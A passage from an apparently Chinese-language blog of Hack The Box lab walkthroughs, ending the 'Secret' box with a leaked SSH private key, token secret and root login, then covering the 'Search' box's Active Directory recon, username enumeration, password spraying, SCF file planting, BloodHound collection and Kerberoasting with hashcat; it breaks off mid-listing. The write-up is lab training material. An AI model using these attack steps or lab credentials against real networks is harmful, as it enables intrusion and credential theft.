KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>.....................................................................<br>EAAAGBAJ+sy5Zu0DhhmcrVAjt0jaUeb3Q38Tc5X5FMOJzMP4RZaUT2ikW4tylGbASsoKDr<br>85oc1mHLONd1AyalDFrPqPTsHqtL4sENUCZlcM76hYxTUsc1xFaI5qAnj8Pu8Da8YrZD65<br>.....................................................................<br>BkBy2Yw/b7MhIucKqFTmGpU1xF2cDq7Lad2Pd1SseJBhgaqLwSjLZUWonPmE79L01t34rP<br>Xe2jKi6brhTBB8U0D8qK9/v2hB4iywAAAAMBAAEAAAGAGkWVDcBX1B8C7eOURXIM6DEUx3<br>...................................................................<br>xhDYPO15YxLBhWJ0J3G9v6SN/YH3UYj47i4s0zk6JZMnVGTfCwXOxLgL/w5WJMelDW+l3k<br>fO8ebYddyVz4w9AAAADnJvb3RAbG9jYWxob3N0AQIDBA==<br>-----END OPENSSH PRIVATE KEY-----<br>/lib/x86_64-linux-gnu/libc.so.6<br>DB_CONNECT=mongodb://127.0.0.1:27017/auth-web<br>instance_var=NODE_APP_INSTANCE<br>unique_id=2da69d97-a4c6-4bf9-b130-b5e3580b2449<br>LESSCLOSE=/usr/bin/lesspipe %s %s<br>LESSOPEN=| /usr/bin/lesspipe %s<br>TOKEN_SECRET=gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE<br>PM2_INTERACTOR_PROCESSING=<span class="hljs-literal">true</span><br>pm_pid_path=/home/dasith/.pm2/pids/index-0.pid<br>pm_err_log_path=/home/dasith/.pm2/logs/index-error.log<br>pm_exec_path=/home/dasith/local-web/index.js<br>pm_out_log_path=/home/dasith/.pm2/logs/index-out.log<br>GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0<br>dasith@secret:/tmp/hack$ <br></code></pre></td></tr></table></figure><p>可能会提示SSH密钥权限太开放不安全，从而需要进行密码认证，把ssh权限改低就好了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; ssh -i id_rsa root@10.10.11.120<br>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br>@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @<br>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br>Permissions 0755 <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;id_rsa&#x27;</span> are too open.<br>It is required that your private key files are NOT accessible by others.<br>This private key will be ignored.<br>Load key <span class="hljs-string">&quot;id_rsa&quot;</span>: bad permissions<br>root@10.10.11.120<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string"></span><br><span class="hljs-string">&gt;&gt; chmod 400 ./id_rsa </span><br><span class="hljs-string">&gt;&gt; ssh -i id_rsa root@10.10.11.120</span><br><span class="hljs-string">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64)</span><br><span class="hljs-string"></span><br><span class="hljs-string">The list of available updates is more than a week old.</span><br><span class="hljs-string">To check for new updates run: sudo apt update</span><br><span class="hljs-string"></span><br><span class="hljs-string">Last login: Tue Oct 26 15:13:55 2021</span><br><span class="hljs-string">root@secret:~# cat /root/root.txt </span><br><span class="hljs-string">06.....................................</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Search</title>
    <link href="/post/HackTheBox-Search.html"/>
    <url>/post/HackTheBox-Search.html</url>
    
    <content type="html"><![CDATA[<h4 id="Recon："><a href="#Recon：" class="headerlink" title="Recon："></a>Recon：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.129<br>Host is up (0.17s latency).<br>Not shown: 65515 filtered tcp ports (no-response)<br>PORT      STATE SERVICE<br>53/tcp    open  domain<br>80/tcp    open  http<br>88/tcp    open  kerberos-sec<br>135/tcp   open  msrpc<br>139/tcp   open  netbios-ssn<br>389/tcp   open  ldap<br>443/tcp   open  https<br>445/tcp   open  microsoft-ds<br>464/tcp   open  kpasswd5<br>593/tcp   open  http-rpc-epmap<br>636/tcp   open  ldapssl<br>3268/tcp  open  globalcatLDAP<br>3269/tcp  open  globalcatLDAPssl<br>8172/tcp  open  unknown<br>9389/tcp  open  adws<br>49667/tcp open  unknown<br>49675/tcp open  unknown<br>49676/tcp open  unknown<br>49702/tcp open  unknown<br>49716/tcp open  unknown<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sC -sV -Pn -T4 -oA nmap.txt -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,8172,9389 10.10.11.129<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.129<br>Host is up (0.35s latency).<br><br>PORT     STATE SERVICE       VERSION<br>53/tcp   open  domain        Simple DNS Plus<br>80/tcp   open  http          Microsoft IIS httpd 10.0<br>|_http-title: Search &amp;mdash; Just Testing IIS<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-server-header: Microsoft-IIS/10.0<br>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-22 09:32:36Z)<br>135/tcp  open  msrpc         Microsoft Windows RPC<br>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=research<br>| Not valid before: 2020-08-11T08:13:35<br>|_Not valid after:  2030-08-09T08:13:35<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-05-22T09:34:11+00:00; 0s from scanner time.<br>443/tcp  open  ssl/http      Microsoft IIS httpd 10.0<br>|_http-server-header: Microsoft-IIS/10.0<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-05-22T09:34:11+00:00; 0s from scanner time.<br>|_http-title: Search &amp;mdash; Just Testing IIS<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>| ssl-cert: Subject: commonName=research<br>| Not valid before: 2020-08-11T08:13:35<br>|_Not valid after:  2030-08-09T08:13:35<br>| tls-alpn: <br>|_  http/1.1<br>445/tcp  open  microsoft-ds?<br>464/tcp  open  kpasswd5?<br>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=research<br>| Not valid before: 2020-08-11T08:13:35<br>|_Not valid after:  2030-08-09T08:13:35<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-05-22T09:34:10+00:00; -1s from scanner time.<br>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=research<br>| Not valid before: 2020-08-11T08:13:35<br>|_Not valid after:  2030-08-09T08:13:35<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-05-22T09:34:10+00:00; -1s from scanner time.<br>3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=research<br>| Not valid before: 2020-08-11T08:13:35<br>|_Not valid after:  2030-08-09T08:13:35<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-05-22T09:34:10+00:00; 0s from scanner time.<br>8172/tcp open  ssl/http      Microsoft IIS httpd 10.0<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-05-22T09:34:10+00:00; 0s from scanner time.<br>| tls-alpn: <br>|_  http/1.1<br>| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH<br>| Not valid before: 2020-04-07T09:05:25<br>|_Not valid after:  2030-04-05T09:05:25<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title.</span><br><span class="hljs-string">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="hljs-string">9389/tcp open  mc-nmf        .NET Message Framing</span><br><span class="hljs-string">Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="hljs-string"></span><br><span class="hljs-string">Host script results:</span><br><span class="hljs-string">| smb2-security-mode: </span><br><span class="hljs-string">|   3.1.1: </span><br><span class="hljs-string">|_    Message signing enabled and required</span><br><span class="hljs-string">| smb2-time: </span><br><span class="hljs-string">|   date: 2022-05-22T09:33:32</span><br><span class="hljs-string">|_  start_date: N/A</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 112.65 seconds</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; whatweb http://10.10.11.129<br>http://10.10.11.129 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[youremail@search.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.129], JQuery[3.3.1], Microsoft-IIS[10.0], Script, Title[Search &amp;mdash; Just Testing IIS], X-Powered-By[ASP.NET]<br></code></pre></td></tr></table></figure><h4 id="80-port："><a href="#80-port：" class="headerlink" title="80 port："></a>80 port：</h4><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220522175118587.png" alt="image-20220522175118587"></p><p>有很多的按钮，但都是锚点，在页面还会有一些人员信息：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220522175351155.png" alt="image-20220522175351155"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; <span class="hljs-built_in">cat</span> username.txt      <br>Keely Lyons<br>Dax Santiago<br>Sierra Frye<br>Kyla Stewart<br>Kaiara Spencer<br>Dave Simpson<br>Ben Thompson<br>Chris Stewart<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; ./namemash.py username.txt &gt; newname.txt<br>&gt;&gt; <span class="hljs-built_in">cat</span> newname.txt                         <br>keelylyons<br>lyonskeely<br>keely.lyons<br>lyons.keely<br>lyonsk<br>..........................<br></code></pre></td></tr></table></figure><p>页面还会有一张图片：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220522181718386.png" alt="image-20220522181718386"  /><p> “Send password to Hope Sharp” “IsolationIsKey?”，不知会不会与目标有关。目录爆破没什么东西，443端口与80端口一样。</p><h4 id="kerberos："><a href="#kerberos：" class="headerlink" title="kerberos："></a>kerberos：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; kerbrute userenum -d search.htb ./newname.txt --dc 10.10.11.129<br><br>    __             __               __     <br>   / /_____  _____/ /_  _______  __/ /____ <br>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \<br> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/<br>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        <br><br>Version: v1.0.3 (9dad6e1) - 05/22/22 - Ronnie Flathers @ropnop<br><br>2022/05/22 18:24:58 &gt;  Using KDC(s):<br>2022/05/22 18:24:58 &gt;  10.10.11.129:88<br><br>2022/05/22 18:24:58 &gt;  [+] VALID USERNAME: keely.lyons@search.htb<br>2022/05/22 18:24:58 &gt;  [+] VALID USERNAME: dax.santiago@search.htb<br>2022/05/22 18:24:58 &gt;  [+] VALID USERNAME: sierra.frye@search.htb<br>2022/05/22 18:25:01 &gt;  [+] VALID USERNAME: hope.sharp@search.htb<br>2022/05/22 18:25:01 &gt;  Done! Tested 90 usernames (4 valid) <span class="hljs-keyword">in</span> 3.259 seconds<br></code></pre></td></tr></table></figure><p>看起来目标的命令规范是 <a href="mailto:&#x6e;&#97;&#x6d;&#101;&#x2e;&#x73;&#117;&#114;&#110;&#97;&#x6d;&#101;&#64;&#x73;&#101;&#97;&#114;&#x63;&#104;&#x2e;&#x68;&#x74;&#x62;">&#x6e;&#97;&#x6d;&#101;&#x2e;&#x73;&#117;&#114;&#110;&#97;&#x6d;&#101;&#64;&#x73;&#101;&#97;&#114;&#x63;&#104;&#x2e;&#x68;&#x74;&#x62;</a>，我试着与刚刚图片中的密码字符串进行喷洒枚举：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; crackmapexec smb 10.10.11.129 -u username.txt -p IsolationIsKey? --continue-on-success<br>/usr/lib/python3/dist-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated<br>  <span class="hljs-string">&quot;class&quot;</span>: algorithms.Blowfish,<br>SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)<br>SMB         10.10.11.129    445    RESEARCH         [-] search.htb\keely.lyons:IsolationIsKey? STATUS_LOGON_FAILURE <br>SMB         10.10.11.129    445    RESEARCH         [-] search.htb\dax.santiago:IsolationIsKey? STATUS_LOGON_FAILURE <br>SMB         10.10.11.129    445    RESEARCH         [-] search.htb\sierra.frye:IsolationIsKey? STATUS_LOGON_FAILURE <br>SMB         10.10.11.129    445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? <br></code></pre></td></tr></table></figure><p>有一个是认证成功的，但目标没有开winrm，但是对有一个共享目录有写入权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; smbmap -u hope.sharp -p IsolationIsKey? -H 10.10.11.129            <br>[+] IP: 10.10.11.129:445Name: search.htb                                        <br>        Disk                                                  PermissionsComment<br>----                                                  ------------------<br>ADMIN$                                            NO ACCESSRemote Admin<br>C$                                                NO ACCESSDefault share<br>CertEnroll                                        READ ONLYActive Directory Certificate Services share<br>helpdesk                                          NO ACCESS<br>IPC$                                              READ ONLYRemote IPC<br>NETLOGON                                          READ ONLYLogon server share <br>RedirectedFolders$                                READ, WRITE<br>SYSVOL                                            READ ONLYLogon server share <br></code></pre></td></tr></table></figure><p>其中有一堆的用户目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; smbclient //10.10.11.129/RedirectedFolders$ -U hope.sharp<br>Password <span class="hljs-keyword">for</span> [WORKGROUP\hope.sharp]:<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                  Dc        0  Sun May 22 18:38:33 2022<br>  ..                                 Dc        0  Sun May 22 18:38:33 2022<br>  abril.suarez                       Dc        0  Wed Apr  8 02:12:58 2020<br>  Angie.Duffy                        Dc        0  Fri Jul 31 21:11:32 2020<br>  Antony.Russo                       Dc        0  Fri Jul 31 20:35:32 2020<br>  belen.compton                      Dc        0  Wed Apr  8 02:32:31 2020<br>  Cameron.Melendez                   Dc        0  Fri Jul 31 20:37:36 2020<br>  chanel.bell                        Dc        0  Wed Apr  8 02:15:09 2020<br>  Claudia.Pugh                       Dc        0  Fri Jul 31 21:09:08 2020<br>  Cortez.Hickman                     Dc        0  Fri Jul 31 20:02:04 2020<br>  dax.santiago                       Dc        0  Wed Apr  8 02:20:08 2020<br>  Eddie.Stevens                      Dc        0  Fri Jul 31 19:55:34 2020<br>  edgar.jacobs                       Dc        0  Fri Apr 10 04:04:11 2020<br>  Edith.Walls                        Dc        0  Fri Jul 31 20:39:50 2020<br>  eve.galvan                         Dc        0  Wed Apr  8 02:23:13 2020<br>  frederick.cuevas                   Dc        0  Wed Apr  8 02:29:22 2020<br>  hope.sharp                         Dc        0  Thu Apr  9 22:34:41 2020<br>  jayla.roberts                      Dc        0  Wed Apr  8 02:07:00 2020<br>  Jordan.Gregory                     Dc        0  Fri Jul 31 21:01:06 2020<br>  payton.harmon                      Dc        0  Fri Apr 10 04:11:39 2020<br>  Reginald.Morton                    Dc        0  Fri Jul 31 19:44:32 2020<br>  santino.benjamin                   Dc        0  Wed Apr  8 02:10:25 2020<br>  Savanah.Velazquez                  Dc        0  Fri Jul 31 20:21:42 2020<br>  sierra.frye                        Dc        0  Thu Nov 18 09:01:46 2021<br>  trace.ryan                         Dc        0  Fri Apr 10 04:14:26 2020<br><br>3246079 blocks of size 4096. 579883 blocks available<br>smb: \&gt; <span class="hljs-built_in">cd</span> chanel.bell\<br>smb: \chanel.bell\&gt; <span class="hljs-built_in">ls</span><br>  .                                  Dc        0  Wed Apr  8 02:15:09 2020<br>  ..                                 Dc        0  Wed Apr  8 02:15:09 2020<br>  Desktop                           DRc        0  Wed Apr  8 02:17:23 2020<br>  Documents                         DRc        0  Wed Apr  8 02:17:25 2020<br>  Downloads                         DRc        0  Wed Apr  8 02:17:24 2020<br><br>3246079 blocks of size 4096. 579883 blocks available<br></code></pre></td></tr></table></figure><p>对他们的目录都没有权限，但我还是放了个SCF文件进去：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">smb: \Angie.Duffy\Desktop\&gt; put user.scf <br>NT_STATUS_ACCESS_DENIED opening remote file \Angie.Duffy\Desktop\user.scf<br>smb: \Angie.Duffy\Desktop\&gt; <span class="hljs-built_in">cd</span> ..<br>smb: \Angie.Duffy\&gt; <span class="hljs-built_in">cd</span> ..<br>smb: \&gt; put user.scf <br>putting file user.scf as \user.scf (0.0 kb/s) (average 0.0 kb/s)<br>smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                  Dc        0  Sun May 22 18:45:17 2022<br>  ..                                 Dc        0  Sun May 22 18:45:17 2022<br>  abril.suarez                       Dc        0  Wed Apr  8 02:12:58 2020<br>  Angie.Duffy                        Dc        0  Fri Jul 31 21:11:32 2020<br>  Antony.Russo                       Dc        0  Fri Jul 31 20:35:32 2020<br>  trace.ryan                         Dc        0  Fri Apr 10 04:14:26 2020<br>  user.scf                           Ac       88  Sun May 22 18:45:17 2022<br></code></pre></td></tr></table></figure><p>不过既然已经有信用认证了，还是能够搜集一些域内信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; bloodhound-python --zip -c All -d SEARCH.htb -u hope.sharp -p IsolationIsKey? -ns 10.10.11.129<br>INFO: Found AD domain: search.htb<br>INFO: Connecting to LDAP server: research.search.htb<br>INFO: Found 1 domains<br>INFO: Found 1 domains <span class="hljs-keyword">in</span> the forest<br>INFO: Found 113 computers<br>INFO: Connecting to LDAP server: research.search.htb<br>INFO: Found 107 <span class="hljs-built_in">users</span><br>INFO: Found 64 <span class="hljs-built_in">groups</span><br>INFO: Found 0 trusts<br>INFO: Done <span class="hljs-keyword">in</span> 00M 57S<br>INFO: Compressing output into 20220522194601_bloodhound.zip<br></code></pre></td></tr></table></figure><p>但可惜，能收集的信息几乎没有。不过点击bloodhound预查询“List all Kerberoastable Accounts”，会看到两个服务账户，其中有一个WEB_SVC账户：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220522195305401.png" alt="image-20220522195305401"></p><h4 id="kerberosting"><a href="#kerberosting" class="headerlink" title="kerberosting:"></a>kerberosting:</h4><p>我可以用hope.sharp身份去请求WEB_SVC的TGS票据：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; GetUserSPNs.py -request -dc-ip 10.10.11.129 search.htb/hope.sharp -outputfile web_svc.hash<br>/usr/lib/python3/dist-packages/pkg_resources/__init__.py:116: PkgResourcesDeprecationWarning: 1.16.0-unknown is an invalid version and will not be supported <span class="hljs-keyword">in</span> a future release<br>  warnings.warn(<br>/usr/lib/python3/dist-packages/pkg_resources/__init__.py:116: PkgResourcesDeprecationWarning: 1.12.1-git20200711.33e2d80-dfsg1-0.6 is an invalid version and will not be supported <span class="hljs-keyword">in</span> a future release<br>  warnings.warn(<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>Password:<br>ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation <br>---------------------------------  -------  --------  --------------------------  ---------  ----------<br>RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 20:59:11.329031  &lt;never&gt;               <br><br><br><br>[-] CCache file is not found. Skipping...<br></code></pre></td></tr></table></figure><p>是处于TGS-REP阶段的票据，对应的13100：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; hashcat -h | grep <span class="hljs-string">&quot;TGS-REP&quot;</span>              <br>  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol<br>  <br>&gt;&gt; hashcat -m 13100 web_svc.hash /usr/share/wordlists/rockyou.txt<br>$krb5tgs$23$*web_svc<span class="hljs-variable">$SEARCH</span>.HTB<span class="hljs-variable">$search</span>.htb/web_svc*$337dfb5b4eeb1c54fdc0998e728b5fd3<span class="hljs-variable">$062ec46e51aa41977e549c3e4f209f74dc80c8c3f43d5aa962d6176b406b8708aa4f77c823069aa7484e1fea8c40ce2a02bf5d7368f072850379a38f2e0863e65d724ba</span>....................<br>6356457366e1a78a54d6ed65ac38c9d091d8b67d607286a02eb4ff72bffff6f4c586976ec66d581d5273c0e03de726ab2aa0afb9b70a3126a440926f44ade3fbc7f5cccac8afddf0ee6001e1f532005954201fb591a5ff422f326b9a025579996a5:@3ONEmillionbaby<br></code></pre></td></tr></table></figure><p>它是有效的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; crackmapexec smb 10.10.11.129 -u web_svc -p @3ONEmillionbaby <br>SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)<br>SMB         10.10.11.129    445    RESEARCH         [+] search.htb\web_svc:@3ONEmillionbaby <br></code></pre></td></tr></table></figure><p>但是它并没有什么新东西：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; smbmap -H 10.10.11.129 -u web_svc -p @3ONEmillionbaby<br>[+] IP: 10.10.11.129:445Name: search.htb                                        <br>        Disk                                                  PermissionsComment<br>----                                                  ------------------<br>ADMIN$                                            NO ACCESSRemote Admin<br>C$                                                NO ACCESSDefault share<br>CertEnroll                                        READ ONLYActive Directory Certificate Services share<br>helpdesk                                          NO ACCESS<br>IPC$                                              READ ONLYRemote IPC<br>NETLOGON                                          READ ONLYLogon server share <br>RedirectedFolders$                                READ, WRITE<br>SYSVOL                                            READ ONLYLogon server share <br></code></pre></td></tr></table></figure><h4 id="密码喷涂："><a href="#密码喷涂：" class="headerlink" title="密码喷涂："></a>密码喷涂：</h4><p>我可以用刚刚在共享中看到了更多用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 